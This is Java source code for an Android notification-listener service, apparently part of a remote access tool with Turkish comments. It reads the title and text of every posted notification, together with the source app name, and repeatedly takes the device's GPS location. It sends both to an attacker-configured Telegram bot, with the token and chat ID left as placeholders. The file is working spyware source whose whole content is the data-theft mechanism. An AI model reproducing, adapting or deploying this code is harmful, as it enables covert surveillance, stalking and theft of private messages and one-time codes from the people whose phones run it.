package com.ahemods.remoteat;

import android.Manifest;
import android.app.Notification;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class MyNotificationListener extends NotificationListenerService {

    private final String BOT_TOKEN = "YOUR TOKEN";
    private final String CHAT_ID = "YOUR ID";

    @Override
    public void onListenerConnected() {
        super.onListenerConnected();
        requestLocation(); // Servis bağlandığında konum iste
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        Notification notification = sbn.getNotification();
        if (notification != null) {
            CharSequence title = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
            CharSequence text = notification.extras.getCharSequence(Notification.EXTRA_TEXT);
            String pkg = sbn.getPackageName();
            if (title != null && text != null) {
                String message = "Bildirim:\nUygulama: " + pkg + "\nBaşlık: " + title + "\nMesaj: " + text;
                sendToTelegram(message);
            }
        }

        // İsteğe bağlı: her bildirimde konumu da gönderebilirsiniz
        requestLocation();
    }

    private void requestLocation() {
        try {
            LocationManager locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, new LocationListener() {
                        @Override
                        public void onLocationChanged(Location location) {
                            if (location != null) {
                                String locMsg = "Konum: Lat=" + location.getLatitude() + ", Lon=" + location.getLongitude();
                                sendToTelegram(locMsg);
                            }
                        }
                        @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                        @Override public void onProviderEnabled(String provider) {}
                        @Override public void onProviderDisabled(String provider) {}
                    }, null);
            }
        } catch (Exception e) {
            Log.e("RemoteAT", "Location error: " + e.toString());
        }
    }

    private void sendToTelegram(final String message) {
        new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                            "/sendMessage?chat_id=" + CHAT_ID +
                            "&text=" + URLEncoder.encode(message, "UTF-8");
                        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                        conn.setRequestMethod("GET");
                        conn.getInputStream().close();
                        conn.disconnect();
                    } catch (Exception e) {
                        Log.e("RemoteAT", e.toString());
                    }
                }
            }).start();
    }
}
